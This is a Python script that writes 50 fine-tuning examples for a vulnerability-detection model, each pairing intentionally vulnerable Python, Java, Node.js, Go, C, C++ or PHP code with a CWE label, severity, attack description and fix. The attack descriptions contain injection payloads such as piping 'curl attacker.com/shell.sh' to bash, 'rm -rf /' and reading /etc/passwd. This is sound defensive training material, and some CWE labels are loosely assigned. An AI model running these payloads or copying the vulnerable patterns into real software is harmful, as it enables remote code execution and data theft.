"""50개 LoRA 학습 데이터 생성 → data/lora_train.jsonl"""
import json
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "data" / "lora_train.jsonl"

def ex(lang, code, cwe_id, cwe_name, severity, attack, fix):
    prompt = f"Analyze this {lang} code for security vulnerabilities:\n\n{code}\n\nVULN_TYPE:"
    completion = f"{cwe_id} {cwe_name}\nSEVERITY: {severity}\nATTACK: {attack}\nFIX:\n{fix}"
    return {"prompt": prompt, "completion": completion}

EXAMPLES = [

# ── CWE-284: Improper Access Control (12) ────────────────────────────────────

ex("Python", """\
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/admin/users', methods=['GET'])
def get_all_users():
    users = db.query("SELECT * FROM users")
    return jsonify(users)""",
"CWE-284","Improper Access Control","CRITICAL",
"Unauthenticated attacker calls /admin/users to dump all user records including password hashes.",
"""\
from flask_login import login_required, current_user

@app.route('/admin/users', methods=['GET'])
@login_required
def get_all_users():
    if not current_user.is_admin:
        abort(403)
    users = db.query("SELECT id, email FROM users")
    return jsonify(users)"""),

ex("Python", """\
@app.route('/api/document/<int:doc_id>')
def get_document(doc_id):
    doc = Document.query.get(doc_id)
    return jsonify(doc.to_dict())""",
"CWE-284","Improper Access Control (IDOR)","HIGH",
"Attacker increments doc_id to access documents belonging to other users.",
"""\
@app.route('/api/document/<int:doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.filter_by(id=doc_id, owner_id=current_user.id).first_or_404()
    return jsonify(doc.to_dict())"""),

ex("Python", """\
import base64, json

def get_user_from_token(token):
    payload = token.split('.')[1]
    data = json.loads(base64.b64decode(payload + '=='))
    return data['user_id'], data['role']""",
"CWE-284","Improper Access Control (JWT not verified)","CRITICAL",
"Attacker crafts a JWT with role=admin and base64-encodes it without a valid signature.",
"""\
import jwt

def get_user_from_token(token):
    data = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    return data['user_id'], data['role']"""),

ex("Python", """\
@app.route('/api/delete_user', methods=['POST'])
def delete_user():
    role = request.headers.get('X-Role', 'user')
    if role == 'admin':
        user_id = request.json['user_id']
        User.query.filter_by(id=user_id).delete()
        db.session.commit()""",
"CWE-284","Improper Access Control (header spoofing)","CRITICAL",
"Attacker sets X-Role: admin header to gain admin privileges and delete any user.",
"""\
@app.route('/api/delete_user', methods=['POST'])
@login_required
def delete_user():
    if not current_user.is_admin:
        abort(403)
    user_id = request.json['user_id']
    User.query.filter_by(id=user_id).delete()
    db.session.commit()"""),

ex("Java", """\
@RestController
@RequestMapping("/api/admin")
public class AdminController {
    @GetMapping("/users")
    public List<User> getAllUsers() {
        return userRepository.findAll();
    }
}""",
"CWE-284","Improper Access Control (missing authorization)","CRITICAL",
"Any authenticated or unauthenticated caller can retrieve all user records via GET /api/admin/users.",
"""\
@RestController
@RequestMapping("/api/admin")
@PreAuthorize("hasRole('ADMIN')")
public class AdminController {
    @GetMapping("/users")
    public List<UserDTO> getAllUsers() {
        return userRepository.findAll().stream()
            .map(UserDTO::fromUser).collect(Collectors.toList());
    }
}"""),

ex("Java", """\
@GetMapping("/report/{reportId}")
public Report getReport(@PathVariable Long reportId) {
    return reportRepository.findById(reportId)
        .orElseThrow(() -> new ResourceNotFoundException("Not found"));
}""",
"CWE-284","Improper Access Control (IDOR)","HIGH",
"Attacker enumerates reportId values to access reports owned by other users.",
"""\
@GetMapping("/report/{reportId}")
@PreAuthorize("isAuthenticated()")
public Report getReport(@PathVariable Long reportId,
                        @AuthenticationPrincipal UserDetails user) {
    Report report = reportRepository.findById(reportId)
        .orElseThrow(() -> new ResourceNotFoundException("Not found"));
    if (!report.getOwnerUsername().equals(user.getUsername()))
        throw new AccessDeniedException("Forbidden");
    return report;
}"""),

ex("Java", """\
@PostMapping("/admin/config")
public ResponseEntity<?> updateConfig(
        @RequestParam String key, @RequestParam String value,
        HttpServletRequest request) {
    configService.update(key, value);
    return ResponseEntity.ok("Updated");
}""",
"CWE-284","Improper Access Control (no session check)","CRITICAL",
"Any HTTP client can POST to /admin/config to overwrite application configuration.",
"""\
@PostMapping("/admin/config")
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<?> updateConfig(
        @RequestParam @NotBlank String key,
        @RequestParam @NotBlank String value) {
    configService.update(key, value);
    return ResponseEntity.ok("Updated");
}"""),

ex("Node.js", """\
app.get('/admin/dashboard', (req, res) => {
    const stats = db.getStats();
    res.json(stats);
});""",
"CWE-284","Improper Access Control (unauthenticated route)","CRITICAL",
"Unauthenticated users can access the admin dashboard and retrieve sensitive statistics.",
"""\
app.get('/admin/dashboard', requireAuth, requireAdmin, (req, res) => {
    const stats = db.getStats();
    res.json(stats);
});"""),

ex("Node.js", """\
app.get('/api/data', async (req, res) => {
    const role = req.query.role || 'viewer';
    if (role === 'admin') {
        return res.json(await db.getAllData());
    }
    res.json(await db.getPublicData());
});""",
"CWE-284","Improper Access Control (role from query param)","CRITICAL",
"Attacker appends ?role=admin to the URL to bypass authorization and retrieve all data.",
"""\
app.get('/api/data', requireAuth, async (req, res) => {
    if (req.user.role === 'admin') {
        return res.json(await db.getAllData());
    }
    res.json(await db.getPublicData());
});"""),

ex("Node.js", """\
app.delete('/api/users/:id', async (req, res) => {
    const userId = req.params.id;
    await User.findByIdAndDelete(userId);
    res.json({ deleted: true });
});""",
"CWE-284","Improper Access Control (missing auth on DELETE)","HIGH",
"Attacker sends DELETE /api/users/1 to delete any account without authentication.",
"""\
app.delete('/api/users/:id', requireAuth, requireAdmin, async (req, res) => {
    const userId = req.params.id;
    await User.findByIdAndDelete(userId);
    res.json({ deleted: true });
});"""),

ex("Go", """\
func adminHandler(w http.ResponseWriter, r *http.Request) {
    users, _ := db.Query("SELECT * FROM users")
    json.NewEncoder(w).Encode(users)
}
func main() {
    http.HandleFunc("/admin", adminHandler)
    http.ListenAndServe(":8080", nil)
}""",
"CWE-284","Improper Access Control (unprotected admin endpoint)","CRITICAL",
"Any caller reaching /admin gets a full user table dump without any authentication.",
"""\
func adminHandler(w http.ResponseWriter, r *http.Request) {
    session := getSession(r)
    if !session.IsAdmin() {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }
    users, _ := db.Query("SELECT id, email FROM users")
    json.NewEncoder(w).Encode(users)
}"""),

ex("Go", """\
func getInvoice(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    var invoice Invoice
    db.Where("id = ?", id).First(&invoice)
    json.NewEncoder(w).Encode(invoice)
}""",
"CWE-284","Improper Access Control (IDOR)","HIGH",
"Authenticated attacker changes ?id= to access invoices belonging to other organizations.",
"""\
func getInvoice(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    userID := getUserIDFromSession(r)
    var invoice Invoice
    result := db.Where("id = ? AND owner_id = ?", id, userID).First(&invoice)
    if result.Error != nil {
        http.Error(w, "Not found", http.StatusNotFound)
        return
    }
    json.NewEncoder(w).Encode(invoice)
}"""),

# ── CWE-416: Use-After-Free (10) ─────────────────────────────────────────────

ex("C", """\
char *buf = (char*)malloc(256);
strcpy(buf, data);
free(buf);
printf("Result: %s\\n", buf);""",
"CWE-416","Use After Free","HIGH",
"Attacker shapes heap to reclaim freed buffer with controlled data, causing arbitrary read or code execution via the dangling pointer.",
"""\
char *buf = (char*)malloc(256);
if (!buf) return -1;
strncpy(buf, data, 255);
buf[255] = '\\0';
printf("Result: %s\\n", buf);
free(buf);
buf = NULL;"""),

ex("C", """\
struct Node *curr = head;
while (curr != NULL) {
    struct Node *next = curr->next;
    process(curr);
    free(curr);
    if (curr->flag) break;
    curr = next;
}""",
"CWE-416","Use After Free (loop body)","HIGH",
"Attacker triggers the dangling pointer read of curr->flag after free to leak adjacent heap data.",
"""\
struct Node *curr = head;
while (curr != NULL) {
    struct Node *next = curr->next;
    int flag = curr->flag;
    process(curr);
    free(curr);
    curr = NULL;
    if (flag) break;
    curr = next;
}"""),

ex("C", """\
char *config = load_config(path);
if (!config) return -1;
if (parse_config(config) < 0) {
    free(config);
    log_error("parse failed: %s", config);
    return -1;
}
free(config);""",
"CWE-416","Use After Free (error path)","MEDIUM",
"Heap-spray attack reclaims the freed config buffer with attacker-controlled content before the log_error read.",
"""\
char *config = load_config(path);
if (!config) return -1;
if (parse_config(config) < 0) {
    log_error("parse failed for path: %s", path);
    free(config);
    return -1;
}
free(config);"""),

ex("C", """\
void cleanup(Resource *res) {
    if (res->data) {
        free(res->data);
    }
    free(res->data);
}""",
"CWE-416","Use After Free (double free)","CRITICAL",
"Double free corrupts the heap allocator freelist, enabling attacker-controlled arbitrary write.",
"""\
void cleanup(Resource *res) {
    if (res->data) {
        free(res->data);
        res->data = NULL;
    }
}"""),

ex("C", """\
int *arr = malloc(n * sizeof(int));
fill_array(arr, n);
free(arr);
sort_array(arr, n);
print_results(arr, n);""",
"CWE-416","Use After Free (freed pointer passed to function)","HIGH",
"Heap reuse between free and sort_array lets attacker influence sort behavior or leak memory.",
"""\
int *arr = malloc(n * sizeof(int));
if (!arr) return;
fill_array(arr, n);
sort_array(arr, n);
print_results(arr, n);
free(arr);
arr = NULL;"""),

ex("C++", """\
MyObject *obj = new MyObject();
obj->initialize();
delete obj;
obj->cleanup();""",
"CWE-416","Use After Free (method call on deleted object)","HIGH",
"Heap spray reclaims the deleted MyObject vtable pointer, redirecting cleanup() to attacker shellcode.",
"""\
MyObject *obj = new MyObject();
obj->initialize();
obj->cleanup();
delete obj;
obj = nullptr;"""),

ex("C++", """\
std::vector<int> vec = {1, 2, 3};
int &ref = vec[0];
vec.push_back(4);
std::cout << ref << std::endl;""",
"CWE-416","Use After Free (dangling reference after reallocation)","MEDIUM",
"Vector reallocation invalidates ref; reading it is undefined behavior that may expose stale stack or heap data.",
"""\
std::vector<int> vec = {1, 2, 3};
vec.reserve(10);
int &ref = vec[0];
vec.push_back(4);
std::cout << ref << std::endl;"""),

ex("C++", """\
std::vector<int> v = {1, 2, 3, 4, 5};
for (auto it = v.begin(); it != v.end(); ++it) {
    if (*it % 2 == 0) {
        v.erase(it);
    }
}""",
"CWE-416","Use After Free (iterator invalidation after erase)","MEDIUM",
"Iterator invalidation causes undefined behavior; attacker input controlling element values may trigger exploitable memory access.",
"""\
std::vector<int> v = {1, 2, 3, 4, 5};
for (auto it = v.begin(); it != v.end(); ) {
    if (*it % 2 == 0) {
        it = v.erase(it);
    } else {
        ++it;
    }
}"""),

ex("C++", """\
void registerCallback(Widget *w) {
    EventLoop::instance().on("click", [w]() {
        w->handleClick();
    });
}
Widget *btn = new Widget();
registerCallback(btn);
delete btn;""",
"CWE-416","Use After Free (callback fires after delete)","HIGH",
"Attacker triggers the click event after btn is deleted to call handleClick on reclaimed heap memory.",
"""\
void registerCallback(std::shared_ptr<Widget> w) {
    EventLoop::instance().on("click", [weak = std::weak_ptr<Widget>(w)]() {
        if (auto locked = weak.lock()) {
            locked->handleClick();
        }
    });
}
auto btn = std::make_shared<Widget>();
registerCallback(btn);"""),

ex("C++", """\
class Buffer {
    char *data;
public:
    Buffer(size_t n) { data = new char[n]; }
    ~Buffer() { delete[] data; }
    Buffer(const Buffer &o) { data = o.data; }
};
Buffer b1(64);
Buffer b2 = b1;""",
"CWE-416","Use After Free (shallow copy double delete)","HIGH",
"Destructing both b1 and b2 deletes the same pointer, corrupting the heap allocator.",
"""\
class Buffer {
    char *data;
    size_t size;
public:
    Buffer(size_t n) : size(n), data(new char[n]) {}
    ~Buffer() { delete[] data; }
    Buffer(const Buffer &o) : size(o.size), data(new char[o.size]) {
        std::memcpy(data, o.data, size);
    }
    Buffer &operator=(const Buffer &) = delete;
};"""),

# ── CWE-77: Command Injection (10) ───────────────────────────────────────────

ex("Python", """\
import os

def ping_host(host):
    os.system(f"ping -c 4 {host}")""",
"CWE-77","OS Command Injection","CRITICAL",
"Attacker passes host='8.8.8.8; rm -rf /' to execute arbitrary commands as the web process user.",
"""\
import subprocess, re

def ping_host(host):
    if not re.fullmatch(r'[\\w.-]+', host):
        raise ValueError("Invalid host")
    subprocess.run(["ping", "-c", "4", host], check=True, timeout=10)"""),

ex("Python", """\
import subprocess

def convert_file(filename):
    output = subprocess.check_output(
        f"convert {filename} output.png",
        shell=True
    )
    return output""",
"CWE-77","OS Command Injection (shell=True)","CRITICAL",
"Attacker sets filename='img.jpg; curl attacker.com/shell.sh | bash' to execute remote code.",
"""\
import subprocess, pathlib

def convert_file(filename):
    path = pathlib.Path(filename).resolve()
    if not path.is_file():
        raise FileNotFoundError(filename)
    output = subprocess.check_output(
        ["convert", str(path), "output.png"], timeout=30
    )
    return output"""),

ex("Python", """\
from flask import request, jsonify

@app.route('/calculate', methods=['POST'])
def calculate():
    expression = request.json['expr']
    result = eval(expression)
    return jsonify({'result': result})""",
"CWE-77","OS Command Injection via eval","CRITICAL",
"Attacker sends expr='__import__(\"os\").system(\"id\")' to execute arbitrary system commands.",
"""\
import ast, operator

SAFE_OPS = {ast.Add: operator.add, ast.Sub: operator.sub,
            ast.Mult: operator.mul, ast.Div: operator.truediv}

def safe_eval(expr):
    tree = ast.parse(expr, mode='eval')
    return _eval(tree.body)

def _eval(node):
    if isinstance(node, ast.Constant): return node.value
    if isinstance(node, ast.BinOp):
        return SAFE_OPS[type(node.op)](_eval(node.left), _eval(node.right))
    raise ValueError("Unsupported expression")

@app.route('/calculate', methods=['POST'])
def calculate():
    result = safe_eval(request.json['expr'])
    return jsonify({'result': result})"""),

ex("Node.js", """\
const { exec } = require('child_process');
app.post('/api/scan', (req, res) => {
    const target = req.body.target;
    exec('nmap -sV ' + target, (err, stdout) => {
        res.json({ output: stdout });
    });
});""",
"CWE-77","OS Command Injection (string concatenation)","CRITICAL",
"Attacker sends target='localhost; cat /etc/passwd' to read arbitrary files via nmap command.",
"""\
const { execFile } = require('child_process');
const net = require('net');

app.post('/api/scan', (req, res) => {
    const target = req.body.target;
    if (!net.isIP(target) && !/^[\\w.-]+$/.test(target)) {
        return res.status(400).json({ error: 'Invalid target' });
    }
    execFile('nmap', ['-sV', '--', target], { timeout: 30000 }, (err, stdout) => {
        res.json({ output: stdout });
    });
});"""),

ex("Node.js", """\
const { execSync } = require('child_process');
router.get('/backup', (req, res) => {
    const dir = req.query.dir;
    const result = execSync(`tar -czf backup.tar.gz ${dir}`);
    res.send(result.toString());
});""",
"CWE-77","OS Command Injection (template literal)","CRITICAL",
"Attacker requests ?dir=. --checkpoint-action=exec=sh to execute code during tar operation.",
"""\
const { execFile } = require('child_process');
const path = require('path');

router.get('/backup', (req, res) => {
    const dir = path.resolve(req.query.dir);
    if (!dir.startsWith(ALLOWED_BACKUP_ROOT)) {
        return res.status(400).json({ error: 'Invalid directory' });
    }
    execFile('tar', ['-czf', 'backup.tar.gz', dir], { timeout: 60000 }, (err) => {
        if (err) return res.status(500).json({ error: 'Backup failed' });
        res.json({ status: 'ok' });
    });
});"""),

ex("Node.js", """\
const vm = require('vm');
app.post('/eval', (req, res) => {
    const code = req.body.code;
    const result = vm.runInNewContext(code, {});
    res.json({ result });
});""",
"CWE-77","OS Command Injection via vm sandbox escape","CRITICAL",
"Attacker escapes vm sandbox using process.mainModule.require('child_process') to run system commands.",
"""\
// Remove the /eval endpoint entirely.
// If expression evaluation is required, use a sandboxed worker process
// with strict allowlists and no access to Node.js built-ins."""),

ex("Java", """\
@PostMapping("/api/report")
public String generateReport(@RequestParam String format) throws IOException {
    String cmd = "reportgen --format " + format + " --output /tmp/report";
    Runtime.getRuntime().exec(cmd);
    return "Report generated";
}""",
"CWE-77","OS Command Injection (string concatenation in exec)","CRITICAL",
"Attacker passes format='pdf --output /dev/null; curl attacker.com/shell | bash' to execute remote code.",
"""\
@PostMapping("/api/report")
public String generateReport(@RequestParam String format) throws IOException {
    List<String> allowed = List.of("pdf", "csv", "html");
    if (!allowed.contains(format)) throw new IllegalArgumentException("Invalid format");
    ProcessBuilder pb = new ProcessBuilder(
        "reportgen", "--format", format, "--output", "/tmp/report");
    pb.start().waitFor();
    return "Report generated";
}"""),

ex("Java", """\
@GetMapping("/network/check")
public String checkHost(@RequestParam String host) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
    Process p = pb.start();
    return new String(p.getInputStream().readAllBytes());
}""",
"CWE-77","OS Command Injection (unvalidated ProcessBuilder arg)","HIGH",
"Attacker passes host='-c 1 localhost; id' as a single string interpreted by the shell.",
"""\
@GetMapping("/network/check")
public String checkHost(@RequestParam String host) throws Exception {
    if (!host.matches("[\\\\w.-]+")) throw new IllegalArgumentException("Invalid host");
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", "--", host);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    return new String(p.getInputStream().readNBytes(4096));
}"""),

ex("PHP", """\
<?php
$ip = $_GET['ip'];
$output = system("ping -c 3 " . $ip);
echo $output;
?>""",
"CWE-77","OS Command Injection (PHP system)","CRITICAL",
"Attacker passes ip=';cat /etc/passwd #' to read sensitive files via shell command injection.",
"""\
<?php
$ip = $_GET['ip'];
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid IP']);
    exit;
}
$output = shell_exec('ping -c 3 ' . escapeshellarg($ip));
echo htmlspecialchars($output);
?>"""),

ex("PHP", """\
<?php
$command = $_POST['command'];
$result = exec($command);
echo json_encode(['output' => $result]);
?>""",
"CWE-77","OS Command Injection (PHP exec with POST)","CRITICAL",
"Attacker POSTs command=id to execute arbitrary OS commands as the web server user.",
"""\
<?php
// Remove arbitrary command execution endpoint entirely.
// If specific commands are needed, use a strict allowlist:
$allowed = ['status', 'version'];
$cmd = $_POST['command'] ?? '';
if (!in_array($cmd, $allowed, true)) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid command']);
    exit;
}
$result = match($cmd) {
    'status'  => getSystemStatus(),
    'version' => getAppVersion(),
};
echo json_encode(['output' => $result]);
?>"""),

# ── CWE-125: Out-of-Bounds Read (8) ──────────────────────────────────────────

ex("C", """\
int scores[10];
int idx = atoi(argv[1]);
printf("Score: %d\\n", scores[idx]);""",
"CWE-125","Out-of-Bounds Read","HIGH",
"Attacker passes idx=-1 or idx=100 to read adjacent memory, potentially leaking stack canaries or pointers.",
"""\
int scores[10];
int idx = atoi(argv[1]);
if (idx < 0 || idx >= 10) {
    fprintf(stderr, "Index out of bounds\\n");
    return 1;
}
printf("Score: %d\\n", scores[idx]);"""),

ex("C", """\
void copy_data(char *dst, const char *src, size_t len) {
    char local_buf[64];
    memcpy(local_buf, src, len);
    process(local_buf);
}""",
"CWE-125","Out-of-Bounds Read (unchecked memcpy length)","HIGH",
"Caller passes len > 64 to overflow local_buf and read or overwrite adjacent stack variables.",
"""\
void copy_data(char *dst, const char *src, size_t len) {
    char local_buf[64];
    if (len >= sizeof(local_buf)) {
        fprintf(stderr, "Input too large\\n");
        return;
    }
    memcpy(local_buf, src, len);
    local_buf[len] = '\\0';
    process(local_buf);
}"""),

ex("C", """\
char url[256];
sprintf(url, "https://api.example.com/users/%s/profile", username);""",
"CWE-125","Out-of-Bounds Read (sprintf buffer overflow)","MEDIUM",
"Attacker provides a 300-character username to overflow url and overwrite the return address.",
"""\
char url[256];
int written = snprintf(url, sizeof(url),
    "https://api.example.com/users/%s/profile", username);
if (written < 0 || (size_t)written >= sizeof(url)) {
    fprintf(stderr, "URL truncated\\n");
    return -1;
}"""),

ex("C", """\
char input[128];
fgets(input, sizeof(input), stdin);
if (input[strlen(input)] == '\\n') {
    input[strlen(input)] = '\\0';
}""",
"CWE-125","Out-of-Bounds Read (off-by-one with strlen)","MEDIUM",
"When input fills the entire 128-byte buffer with no newline, strlen returns 127 and input[127] is the terminator; the check reads input[128] which is out of bounds.",
"""\
char input[128];
if (fgets(input, sizeof(input), stdin)) {
    size_t len = strlen(input);
    if (len > 0 && input[len - 1] == '\\n')
        input[len - 1] = '\\0';
}"""),

ex("C++", """\
std::vector<int> data = getData();
int index = getUserIndex();
int value = data[index];""",
"CWE-125","Out-of-Bounds Read (unchecked vector index)","HIGH",
"Attacker-controlled index outside [0, data.size()) causes undefined behavior and potential heap data leak.",
"""\
std::vector<int> data = getData();
int index = getUserIndex();
if (index < 0 || static_cast<size_t>(index) >= data.size()) {
    throw std::out_of_range("Index out of bounds");
}
int value = data.at(index);"""),

ex("C++", """\
std::string parseToken(const std::string &header) {
    size_t pos = header.find("Bearer ");
    return header.substr(pos + 7);
}""",
"CWE-125","Out-of-Bounds Read (npos arithmetic)","HIGH",
"If 'Bearer ' is absent, find returns npos; npos+7 wraps to a huge value, causing substr to throw or read garbage.",
"""\
std::string parseToken(const std::string &header) {
    const std::string PREFIX = "Bearer ";
    size_t pos = header.find(PREFIX);
    if (pos == std::string::npos)
        throw std::invalid_argument("Missing Bearer prefix");
    return header.substr(pos + PREFIX.size());
}"""),

ex("C++", """\
const int MAX = 100;
int buffer[MAX];
int n = receiveData(buffer, 200);
for (int i = 0; i < n; i++) {
    process(buffer[i]);
}""",
"CWE-125","Out-of-Bounds Read (receive larger than buffer)","HIGH",
"receiveData writes up to 200 ints into a 100-element array; processing beyond index 99 reads uninitialized stack data.",
"""\
const int MAX = 100;
int buffer[MAX];
int n = receiveData(buffer, MAX);
if (n < 0 || n > MAX) { handleError(); return; }
for (int i = 0; i < n; i++) {
    process(buffer[i]);
}"""),

ex("C++", """\
char *str = getInput();
int i = 0;
while (str[i] != ' ') {
    token[i] = str[i];
    i++;
}""",
"CWE-125","Out-of-Bounds Read (missing null terminator check)","MEDIUM",
"If input contains no space, the loop reads past the end of str until it hits unmapped memory, causing a crash or data leak.",
"""\
char *str = getInput();
int i = 0;
while (str[i] != '\\0' && str[i] != ' ' && i < TOKEN_MAX - 1) {
    token[i] = str[i];
    i++;
}
token[i] = '\\0';"""),

# ── CWE-200: Information Exposure (5) ────────────────────────────────────────

ex("Python", """\
@app.route('/api/login', methods=['POST'])
def login():
    try:
        user = authenticate(request.json)
        return jsonify({'token': generate_token(user)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500""",
"CWE-200","Information Exposure (exception in API response)","MEDIUM",
"Attacker triggers a DB error to receive the full exception message including table schema or credentials in the response.",
"""\
@app.route('/api/login', methods=['POST'])
def login():
    try:
        user = authenticate(request.json)
        return jsonify({'token': generate_token(user)})
    except AuthenticationError:
        return jsonify({'error': 'Invalid credentials'}), 401
    except Exception:
        app.logger.exception("Login error")
        return jsonify({'error': 'Internal server error'}), 500"""),

ex("Python", """\
def authenticate(username, password):
    logging.debug(f"Auth attempt: user={username}, pass={password}")
    return db.check_credentials(username, password)""",
"CWE-200","Information Exposure (password in log)","HIGH",
"Log aggregation systems or log file readers expose plaintext passwords to unauthorized personnel.",
"""\
def authenticate(username, password):
    logging.debug("Auth attempt for user: %s", username)
    return db.check_credentials(username, password)"""),

ex("Java", """\
@PostMapping("/api/data")
public ResponseEntity<?> processData(@RequestBody DataRequest req) {
    try {
        return ResponseEntity.ok(service.process(req));
    } catch (Exception e) {
        e.printStackTrace();
        return ResponseEntity.status(500).body(e.getMessage());
    }
}""",
"CWE-200","Information Exposure (stack trace in HTTP response)","MEDIUM",
"Attacker submits malformed data to trigger an exception and receive the full stack trace revealing internal class names and file paths.",
"""\
@PostMapping("/api/data")
public ResponseEntity<?> processData(@RequestBody DataRequest req) {
    try {
        return ResponseEntity.ok(service.process(req));
    } catch (Exception e) {
        log.error("processData failed", e);
        return ResponseEntity.status(500).body("Internal server error");
    }
}"""),

ex("Java", """\
@Bean
public DataSource dataSource() {
    String url = env.getProperty("db.url");
    String password = env.getProperty("db.password");
    log.info("Connecting: url={}, password={}", url, password);
    return new DriverManagerDataSource(url, "admin", password);
}""",
"CWE-200","Information Exposure (credentials in log)","HIGH",
"Log shipping to a SIEM or log file access by a junior developer exposes the database password in plaintext.",
"""\
@Bean
public DataSource dataSource() {
    String url = env.getProperty("db.url");
    String password = env.getProperty("db.password");
    log.info("Connecting to DB: {}", url);
    return new DriverManagerDataSource(url, "admin", password);
}"""),

ex("Node.js", """\
app.use((err, req, res, next) => {
    console.error(err);
    res.status(500).json({
        error: err.message,
        stack: err.stack,
        query: req.query
    });
});""",
"CWE-200","Information Exposure (stack trace and query in error handler)","MEDIUM",
"Attacker reads stack property in JSON error response to learn internal file paths, module versions, and query parameters of other users.",
"""\
app.use((err, req, res, next) => {
    console.error(err);
    if (process.env.NODE_ENV === 'development') {
        res.status(500).json({ error: err.message, stack: err.stack });
    } else {
        res.status(500).json({ error: 'Internal server error' });
    }
});"""),

# ── CWE-190: Integer Overflow (5) ────────────────────────────────────────────

ex("C", """\
void *allocate_grid(int width, int height, int depth) {
    int size = width * height * depth;
    return malloc(size);
}""",
"CWE-190","Integer Overflow (size calculation)","HIGH",
"Attacker passes width=65536, height=65536 causing size to overflow to a small value, so malloc allocates too little memory and subsequent writes overflow the heap.",
"""\
#include <stdint.h>
void *allocate_grid(int width, int height, int depth) {
    if (width <= 0 || height <= 0 || depth <= 0) return NULL;
    size_t size;
    if (__builtin_mul_overflow((size_t)width, (size_t)height, &size) ||
        __builtin_mul_overflow(size, (size_t)depth, &size)) {
        return NULL;
    }
    return malloc(size);
}"""),

ex("C", """\
size_t length = strlen(input);
int len = (int)length;
char *buf = malloc(len + 1);
memcpy(buf, input, len);""",
"CWE-190","Integer Overflow (size_t to int cast)","HIGH",
"Input longer than INT_MAX causes len to wrap to a negative number; malloc(negative+1) allocates a tiny buffer that overflows on memcpy.",
"""\
size_t length = strlen(input);
if (length > (size_t)INT_MAX) { return NULL; }
char *buf = malloc(length + 1);
if (!buf) return NULL;
memcpy(buf, input, length);
buf[length] = '\\0';"""),

ex("C", """\
unsigned int total_bytes = num_elements * element_size;
char *pool = (char*)malloc(total_bytes);""",
"CWE-190","Integer Overflow (unsigned multiplication)","HIGH",
"Large num_elements × element_size wraps around modulo 2^32, allocating a too-small buffer for subsequent writes.",
"""\
#include <stdint.h>
size_t total_bytes;
if (__builtin_mul_overflow((size_t)num_elements, (size_t)element_size, &total_bytes)) {
    return NULL;
}
char *pool = (char*)malloc(total_bytes);"""),

ex("Java", """\
@GetMapping("/paginate")
public List<Item> getPage(@RequestParam String pageStr,
                           @RequestParam String sizeStr) {
    int page = Integer.parseInt(pageStr);
    int size = Integer.parseInt(sizeStr);
    int offset = page * size;
    return itemRepo.findAll(offset, size);
}""",
"CWE-190","Integer Overflow (int multiplication in pagination)","MEDIUM",
"Attacker passes page=100000&size=100000 causing offset to overflow to a negative number, bypassing pagination and returning unintended records.",
"""\
@GetMapping("/paginate")
public List<Item> getPage(@RequestParam @Min(0) @Max(10000) int page,
                           @RequestParam @Min(1) @Max(100) int size) {
    long offset = (long) page * size;
    return itemRepo.findAll(offset, size);
}"""),

ex("Java", """\
public long sumArray(int[] arr) {
    int sum = 0;
    for (int val : arr) {
        sum += val;
    }
    return sum;
}""",
"CWE-190","Integer Overflow (int accumulator for long result)","LOW",
"Summing large arrays overflows sum silently; the cast to long returns a wrong value, causing downstream financial or security calculations to fail.",
"""\
public long sumArray(int[] arr) {
    long sum = 0L;
    for (int val : arr) {
        sum += val;
    }
    return sum;
}"""),

]  # end EXAMPLES (50)


def main():
    assert len(EXAMPLES) == 50, f"Expected 50 examples, got {len(EXAMPLES)}"
    OUT.parent.mkdir(exist_ok=True)
    with open(OUT, "w", encoding="utf-8") as f:
        for item in EXAMPLES:
            f.write(json.dumps(item, ensure_ascii=False) + "\n")

    # 분포 요약
    from collections import Counter
    cwe_dist = Counter()
    for item in EXAMPLES:
        comp = item["completion"]
        cwe  = comp.split()[0]
        cwe_dist[cwe] += 1

    print(f"\n학습 데이터 생성 완료: {OUT}")
    print(f"총 {len(EXAMPLES)}개\n")
    print(f"{'CWE':<12}  Count")
    print("─" * 22)
    for cwe, cnt in sorted(cwe_dist.items()):
        print(f"{cwe:<12}  {cnt}")


if __name__ == "__main__":
    main()
